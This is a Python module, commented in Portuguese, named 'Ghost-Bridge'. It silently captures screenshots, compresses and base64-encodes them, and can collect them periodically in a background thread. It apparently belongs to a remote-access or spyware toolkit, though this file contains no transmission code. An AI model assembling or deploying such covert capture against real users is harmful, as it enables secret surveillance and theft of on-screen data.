"""
Ghost-Bridge - Screenshot Module
Captura de tela silenciosa com compressão.
"""
import io
import base64
import threading
import time
from datetime import datetime

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False


class ScreenCapture:
    """
    Captura de tela com múltiplos métodos e compressão.
    
    Features:
    - Captura tela inteira ou monitor específico
    - Compressão JPEG configurável
    - Redimensionamento para economizar banda
    - Captura periódica automática
    """
    
    def __init__(self, quality=50, max_width=1280):
        """
        Args:
            quality: Qualidade JPEG (1-100, menor = menor tamanho)
            max_width: Largura máxima da imagem (redimensiona se maior)
        """
        self.quality = quality
        self.max_width = max_width
        self.running = False
        self.screenshots = []
        self.lock = threading.Lock()
        
        # Verifica dependências
        if not PIL_AVAILABLE and not MSS_AVAILABLE:
            raise ImportError("[!] Instale PIL ou mss: pip install pillow mss")
    
    def _resize_image(self, img):
        """Redimensiona mantendo proporção."""
        width, height = img.size
        if width > self.max_width:
            ratio = self.max_width / width
            new_size = (self.max_width, int(height * ratio))
            return img.resize(new_size, Image.LANCZOS)
        return img
    
    def capture(self, monitor=None):
        """
        Captura screenshot e retorna como base64.
        
        Args:
            monitor: Índice do monitor (None = todos)
            
        Returns:
            Dict com timestamp, dimensions e data (base64)
        """
        try:
            # Método 1: mss (mais rápido, multi-monitor)
            if MSS_AVAILABLE:
                with mss.mss() as sct:
                    if monitor is not None:
                        mon = sct.monitors[monitor]
                    else:
                        mon = sct.monitors[0]  # Tela inteira
                    
                    sct_img = sct.grab(mon)
                    img = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
            
            # Método 2: PIL (fallback)
            elif PIL_AVAILABLE:
                img = ImageGrab.grab()
            
            else:
                return None
            
            # Redimensiona
            img = self._resize_image(img)
            
            # Converte para JPEG em memória
            buffer = io.BytesIO()
            img.save(buffer, format='JPEG', quality=self.quality, optimize=True)
            
            # Encode base64
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            return {
                'timestamp': datetime.now().isoformat(),
                'width': img.size[0],
                'height': img.size[1],
                'size_kb': len(img_base64) // 1024,
                'data': img_base64
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def capture_all_monitors(self):
        """Captura cada monitor separadamente."""
        if not MSS_AVAILABLE:
            return [self.capture()]
        
        screenshots = []
        with mss.mss() as sct:
            for i, mon in enumerate(sct.monitors[1:], 1):  # Skip "all monitors"
                shot = self.capture(monitor=i)
                if shot:
                    shot['monitor'] = i
                    screenshots.append(shot)
        
        return screenshots
    
    def start_periodic(self, interval=60):
        """
        Inicia captura periódica em background.
        
        Args:
            interval: Segundos entre capturas
        """
        self.running = True
        
        def loop():
            while self.running:
                shot = self.capture()
                if shot and 'error' not in shot:
                    with self.lock:
                        self.screenshots.append(shot)
                        # Mantém apenas últimas 10
                        if len(self.screenshots) > 10:
                            self.screenshots.pop(0)
                time.sleep(interval)
        
        thread = threading.Thread(target=loop, daemon=True)
        thread.start()
        print(f"[+] Captura periódica iniciada (intervalo: {interval}s)")
    
    def stop_periodic(self):
        """Para a captura periódica."""
        self.running = False
    
    def get_screenshots(self, clear=True):
        """Retorna screenshots capturados."""
        with self.lock:
            shots = self.screenshots.copy()
            if clear:
                self.screenshots = []
            return shots


# Teste standalone
if __name__ == "__main__":
    print("[*] Teste de Screenshot")
    sc = ScreenCapture(quality=30, max_width=800)
    
    shot = sc.capture()
    print(f"[+] Capturado: {shot['width']}x{shot['height']}, {shot['size_kb']}KB")
    
    # Salva para teste
    with open("test_screenshot.jpg", "wb") as f:
        f.write(base64.b64decode(shot['data']))
    print("[+] Salvo como test_screenshot.jpg")
